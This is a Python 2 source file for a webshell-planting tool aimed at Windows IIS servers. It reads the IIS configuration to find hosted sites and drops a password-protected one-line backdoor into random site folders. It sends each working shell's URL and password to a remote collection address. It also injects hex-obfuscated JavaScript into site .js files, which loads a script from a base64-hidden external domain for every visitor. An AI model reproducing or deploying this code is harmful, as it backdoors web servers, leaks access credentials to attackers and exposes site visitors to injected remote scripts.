#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

import re
import os
import random
import sys
import time
import yijuhua
import urllib2
import binascii
import base64


def Aurl_post(URL):   #提交数据
    try:
        req = urllib2.Request(URL)
        req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
        s = urllib2.urlopen(req,timeout=10)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        #ss = s.read()
    except Exception,e:
        print e
        return 0

def open_file():
    try:
        #C:\WINDOWS\system32\inetsrv\MetaBase.xml
        #fname="C:\WINDOWS\system32\inetsrv\MetaBase.xml"
        fname="2.xml"
        xxx = file(fname, 'r')
        return xxx.read()
    except BaseException, e:
        print "IIS INI Not found C:\WINDOWS\system32\inetsrv\MetaBase.xml"
        #print(str(e))
        return 0

def TQ_Path(data):  #网站路径
    Path_data=data[len(data)-1:] #字符串删除
    if Path_data=="\\":
        return data[0:len(data)-1]
    return data

def http_www_url(url_data):  #获取网站 网址
    list=[]
    list_2=[]
    #url_data=":80:www.hongzedami.com			:80:hongzedami.com"
    wwwlist=url_data.split(":")
    for url in wwwlist:
        if len(url)>=4:
            url2=str(url).strip().lstrip().rstrip('')
            #print url2
            list.append("http://"+url2+"/")  #添加数据
    #去除重复
    for i in list:
        if i not in list_2:
            list_2.append(i)
    return list_2

def list_file(dir,topdown=True):  #遍历路径
    list=[]
    for root, dirs, files in os.walk(dir, topdown):
        data_dir=os.path.join(root)+"\\"
        if os.path.isdir(data_dir):
            list.append(data_dir)  #添加数据
    if len(list)<=0:
        if os.path.isdir(dir+"\\"):
            list.append(dir+"\\")  #添加数据
    return list

def sjs_random(zd0,zd1):  #获取随机数
    return random.randint(zd0, zd1)

def download_bz(download_data1,download_data2): #编辑路径download_bz("D:\wamp\www","D:\wamp\www\CPM\Index\Lib\Action\\") #编辑路径
    return download_data2[len(download_data1)+1:]

def sj_az_AZ(Z1):  #随机抽取字符串
    s = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    return ''.join(random.sample(s,sjs_random(3,Z1)))

def IIS_xml():
    data=open_file()
    if data==0:
        print u"Cannot find the file path in the C IIsWebServerfile"  #无法找到IIS配置文件
        return 0
    p1 = re.compile(r'<IIsWebVirtualDir(.+?)</IIsWebServer>')
    data1=data.replace("\n", '')  #去除换行符好匹配
    IISWEB = p1.findall(data1)#网站路径
    for every1 in IISWEB:#网站路径
        try:
            p2 = re.compile(r'ServerBindings="(.+?)"')
            data2 = p2.findall(every1)#网站域名
            if len(data2)<1:
                continue  #跳过   这一次
            p3 = re.compile(r'Path="(.+?)"')
            data3 = p3.findall(every1)#网站路径
            if len(data3)<1:
                continue  #跳过   这一次
            download_Path= TQ_Path(data3[0])  #网站路径
            data_list=list_file(download_Path)    #遍历文件
            if len(data_list)>=1:
                data_url2="%s%s.%s"%(data_list[sjs_random(0,len(data_list))],sj_az_AZ(8),ASP_PHP)  #传马目录  D:\wamp\www\CPM\Index\Lib\Action\
            else:
                continue  #跳过   这一次
            www_bool=False  #True
            for www_url in http_www_url(data2[0]):
                print "www:%s"%(www_url)  #网址  http://localhost/
                print "download_Path:%s"%(download_Path)  #主目录  D:\wamp\www
                print "download_Path eval:%s"%(data_url2)    #文件路径  D:\wamp\www\mythink\.svn\pristine\4b\vuZelUL.php
                www_url2="%s%s"%(www_url,download_bz(download_Path,data_url2).replace("\\", '/')) #编辑路径 http://localhost/mythink/.svn/pristine/4b/vuZelUL.php
                print "www_Path:%s"%(www_url2)  #网址  http://localhost/
                path_file(data_url2,argv1)  #写入文件 路径 文件
                if yijuhua.yijuhua_cs(ASP_PHP,str(www_url2),str(argv2)):
                    www_bool=True
                    data="%s|%s"%(str(www_url2),str(argv2))
                    TXT_file2("webshell--OK.txt",data)
                    print "file:%s"%(data_url2)
                    print "url:%s password:%s--OK"%(str(www_url2),str(argv2))
                    if not argv3=="":
                        data_url="%s?url=%s&passwod=%s"%(str(argv3),str(www_url2),str(argv2))
                        yijuhua.Aurl_post(data_url) #远程提交到后台
                        print "post %s"%(data_url)
                else:
                    data="%s|%s"%(str(www_url2),str(argv2))
                    TXT_file2("webshell--NO.txt",data)
                    print "file:%s"%(data_url2)
                    print "url:%s password:%s--NO"%(str(www_url2),str(argv2))
            print "----------------------------------------"
            list_file_js(download_Path)  #遍历路径  挂载JS
            if www_bool==False:
                if os.path.isfile(data_url2):  #查看文件是否存在
                    os.remove(data_url2) #删除文件
                    print "delete %s"%(data_url2)
        except BaseException, e:
            #print(str(e))
            return 0

####################################################################
#文件操作
def path_file(path,fname):  #写入文件 路径 文件
    try:
        xxx = file(fname, 'r')  #读取要写入的文件
        data=xxx.read()

        file_object = open(path, 'w+') #写入文件
        file_object.writelines("\n")
        file_object.writelines(data)
        file_object.close()
    except BaseException, e:
        print(str(e))
        return 0

def TXT_file(name,data):  #写入文本 中文
    try:
        #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
        file_object = open(name,'a+')
        file_object.write(data) #成功
        file_object.writelines("\n")
        file_object.close()
    except Exception,e:
        print "Write TXT failed",e
        return 0

def TXT_file2(file_nem,data):  #写入文本
    try:
        #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
        file_object = open(file_nem,'a')
        #file_object.write(list_passwed[E])
        file_object.writelines(data)
        file_object.writelines("\n")
        file_object.close()
    except Exception,e:
        print "111111",e
        return 0

def ASCII_16(string_num): #ASCII转换成16进制
    return "\\x"+binascii.b2a_hex(string_num)

def x16_ASCII(string_num): #16进制转换成ASCII
    return binascii.a2b_hex(string_num)

def for_str(data):  #字符串转换成16进制
    my_str=""
    for i, ch in enumerate(data):
        as_16=ASCII_16(ch) #ASCII转换成16进制
        my_str = my_str + as_16
    return my_str
####################################################################
def list_file_js(dir,topdown=True):  #遍历路径
    for root, dirs, files in os.walk(dir, topdown):
        data_dir=os.path.join(root)+"\\"
        for root, dirs, files in os.walk(data_dir):
            for file in files:
                if file.endswith('.js'):
                    data_data= "%s%s"%(data_dir,file)
                    if os.path.isfile(data_data):  #查看文件是否存在
                        if sjs_random(0,100)<=10:  #获取随机数
                            s2 = base64.decodestring("d2Vic2NhbjE5ODkudXMvVE9N") #解密   webscan1989.us/TOM
                            data='document.write(\'<script type="text/javascript" src="http://%s.%s/ip.php"></script>\');'%(sj_az_AZ(6),s2)
                            #document.write('<script type="text/javascript" src="http://uf3.webscan1989.us/TOM/ip.php"></script>');
                            #data='<script type="text/javascript" src="http://%s.%s/ip.php"></script>'%(sj_az_AZ(6),"webscan1989.us/TOM")
                            #<script type="text/javascript" src="http://www.webscan1989.us/TOM/ip.php"></script>
                            data2="\r\nvar _$=['%s'];document.write( _$[0]);"%(for_str(data))  #字符串转换成16进制
                            TXT_file2(data_data,data2)  #写入文本 中文
                            #print data_data

def list_file_js2(dir,topdown=True):  #遍历路径
    for root, dirs, files in os.walk(dir, topdown):
        data_dir=os.path.join(root)+"\\"
        for root, dirs, files in os.walk(data_dir):
            for file in files:
                if file.endswith('.js'):
                    data_data= "%s%s"%(data_dir,file)
                    if os.path.isfile(data_data):  #查看文件是否存在
                        s2 = base64.decodestring("d2Vic2NhbjE5ODkudXMvVE9N") #解密   webscan1989.us/TOM
                        data='document.write(\'<script type="text/javascript" src="http://%s.%s/ip.php"></script>\');'%(sj_az_AZ(6),s2)
                        data2="\r\nvar _$=['%s'];document.write( _$[0]);"%(for_str(data))  #字符串转换成16进制
                        TXT_file2(data_data,data2)  #写入文本 中文
                        print data_data
    while True:
        print "file null IIS web xxxxxxx"
        time.sleep(5)

if __name__ == "__main__":
    print "Windows 2003 Server IIS eval V1.5"
    print "BY:2602159946@qq.com"
    print "============================================"
    global argv1 #导入参数1 一句话文件
    global ASP_PHP #
    global argv2 #导入参数2 一句话密码
    global argv3 #导入参数3 提交后台地址
    argv1=""
    argv2=""
    argv3=""

    if str(sys.argv[1])=="file":
        print str(sys.argv[1])
        print str(sys.argv[2])
        list_file_js2(str(sys.argv[2]))  #遍历路径

    if len(sys.argv) <= 2:
        print "maim.exe xxx.php passwod"
        print "maim.exe xxx.php passwod http://www.xxx.com/webshell.php"
        print "maim.exe xxx.asp passwod"
        print "maim.exe xxx.asp passwod http://www.xxx.com/webshell.php"
        #time.sleep(10)
        #sys.exit()
        while True:
            print "!!!!!!!!!"
            time.sleep(5)

    try:
        if not sys.argv[1]=="":
            if (".asp" in sys.argv[1] or ".ASP" in sys.argv[1] or ".Asp" in sys.argv[1]):
                ASP_PHP="asp"
            if (".php" in sys.argv[1] or ".PHP" in sys.argv[1] or ".Php" in sys.argv[1]):
                ASP_PHP="php"
            argv1=sys.argv[1]  #一句话文件

        if not sys.argv[2]=="":
            argv2=sys.argv[2]
        if not sys.argv[3]=="":
            argv3=sys.argv[3]
    except Exception,e:
        #print e
        pass

    #直接写入文件
    IIS_xml()  #iis操作

    while True:
        print "file null IIS web"
        time.sleep(5)




